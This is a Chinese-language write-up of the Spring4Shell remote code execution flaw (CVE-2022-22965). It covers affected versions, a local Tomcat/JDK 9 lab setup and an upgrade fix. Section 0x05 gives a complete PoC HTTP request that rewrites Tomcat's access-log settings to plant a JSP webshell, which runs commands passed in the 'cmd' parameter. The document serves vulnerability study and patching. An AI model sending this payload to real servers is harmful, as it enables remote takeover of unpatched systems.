# Spring Core-Spring4Shell RCE（CVE-2022-22965）
# 0x01 漏洞概述
Spring是目前全球最受欢迎的Java轻量级开源框架。近日网上爆出Spring核心框架存在RCE漏洞（编号CVE-2022-22965），这个漏洞被称为Spring4Shell。3月31日官方发布了漏洞信息，并在新版本v5.3.18和v5.2.20中修复了漏洞。

Spring MVC框架的参数绑定功能提供了将请求中的参数绑定控制器方法中参数对象的成员变量，攻击者通过构造恶意请求获取AccessLogValve对象并注入恶意字段值触发pipeline机制可写入任意路径下的文件。 

分析后发现漏洞结合了JDK9及以上版本一个新的属性，成功绕过历史漏洞CVE-2010-1622修复补丁，同时结合Tomcat容器的一些操作属性，可以实现GetShell。当然Weblogic、Jetty等其他Java中间件或应用程序也可能构建出完整利用链，不过按照目前的研究进度，该漏洞的影响范围较为受限。

# 0x02 影响范围

- Spring Framework 5.3.X < 5.3.18 
- Spring Framework 5.2.X < 5.2.20

- 受影响条件（需同时满足）：
   - JDK 9 及以上版本
   - Apache Tomcat 作为 Servlet 容器，且日志记录功能开启（默认状态）
   - Spring 框架以及衍生的框架
# 0x03 漏洞原理

[https://github.com/lanjelot/kb/blob/master/struts](https://github.com/lanjelot/kb/blob/master/struts)

[SpringMVC框架任意代码执行漏洞(CVE-2010-1622)分析](http://rui0.cn/archives/1158)

# 0x04 环境搭建
apache-tomcat-9.0.56
jdk-9.0.4

将有漏洞的war包放到tomcat的webapps下，刷新，自动解压

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1648643333759-6e3b2246-9b13-47a7-a5fa-787cb5c16143.png#clientId=u5a1dc6b1-de15-4&from=paste&height=251&id=u4a9476c4&margin=%5Bobject%20Object%5D&name=image.png&originHeight=334&originWidth=780&originalType=binary&ratio=1&size=30978&status=done&style=none&taskId=uba73ad91-c89c-4a74-abe0-afcc2599c0b&width=585)

修改bin目录中的`setclasspath.bat`文件，配置以jdk9启动tomcat

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1648642390489-63c33761-4ea1-41b1-a175-912cc58c4178.png#clientId=u34adb3ef-d89f-4&from=paste&id=u3c05b29c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=64&originWidth=631&originalType=binary&ratio=1&size=8530&status=done&style=none&taskId=ud9422165-371e-48b6-b127-bb94ff6d194)

进入bin目录，以管理员身份启动`startup.bat`，使用jdk9启动tomcat

![image](https://user-images.githubusercontent.com/84888757/161367222-12d5a3e1-684e-48a3-91fb-dc474806f7d4.png)


# 0x05 漏洞复现
poc：
```
POST /xxx/xxx HTTP/1.1
Host: 127.0.0.1:8080
Content-Type:application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Cache-Control: max-age=0
prefix: <% java
suffix: %>
Content-Length: 648

class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=hello&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=88&class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25{prefix}i.io.InputStream input=Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream()%3bint len = -1%3bbyte[] bytes = new byte[4092]%3bwhile((len = input.read(bytes)) != -1){out.println(new String(bytes, "utf-8"))%3b}%25{suffix}i
```

![image](https://user-images.githubusercontent.com/84888757/162146845-cf89bed9-008d-43fe-b05a-c44fbe5d013f.png)


![image](https://user-images.githubusercontent.com/84888757/162146503-b901ebd1-c3a2-4664-8e27-5d44459d9bc7.png)


# 0x06 修复方案
目前 Spring 官方已经发布了解决上述漏洞的安全更新，建议受影响用户尽快升级到安全版本：
安全版本:    
Spring Framework == 5.3.18 
Spring Framework == 5.2.20
官方安全版本下载可以参考以下链接：

[https://github.com/spring-projects/spring-framework/tags](https://github.com/spring-projects/spring-framework/tags)

# 0x07 参考链接
- [https://mp.weixin.qq.com/s/G1z7mydl4nc9SxcZjwUQwg](https://mp.weixin.qq.com/s/G1z7mydl4nc9SxcZjwUQwg)

- [Spring Framework 远程代码执行漏洞(CVE-2022-22965) @斗象](https://vas.riskivy.com/vuln-detail?id=117)

- [https://www.inbreak.net/archives/377](https://www.inbreak.net/archives/377)

- [https://github.com/lanjelot/kb/blob/master/struts](https://github.com/lanjelot/kb/blob/master/struts)

- [http://rui0.cn/archives/1158](http://rui0.cn/archives/1158)
